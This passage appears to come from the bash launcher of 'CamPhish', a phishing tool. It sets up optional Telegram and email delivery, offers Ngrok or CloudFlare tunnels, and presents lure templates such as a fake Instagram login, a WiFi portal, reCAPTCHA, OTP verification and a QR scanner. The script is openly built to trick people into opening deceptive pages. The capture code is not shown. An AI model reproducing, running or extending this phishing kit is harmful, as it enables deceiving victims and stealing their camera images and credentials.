fi

# Setup Telegram (optional)
setup_telegram

# Setup Email (optional)
setup_email

# Generate random URL path
generate_random_path

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n\e[1;93m-----Choose a template----\e[0m\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Instagram Login \e[1;91m[NEW]\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Free WiFi Portal \e[1;91m[NEW]\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google reCAPTCHA \e[1;91m[NEW]\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m AI Chatbot \e[1;91m[NEW]\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m OTP Verification \e[1;91m[NEW]\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m QR Code Scanner \e[1;91m[NEW]\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
  fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -ge 3 ]] && [[ $option_tem -le 9 ]]; then
  printf "\e[1;92m[\e[0m*\e[1;92m] Template selected!\e[0m\n"
else
  printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
  sleep 1
  select_template
fi
fi
}

banner
dependencies
camphish
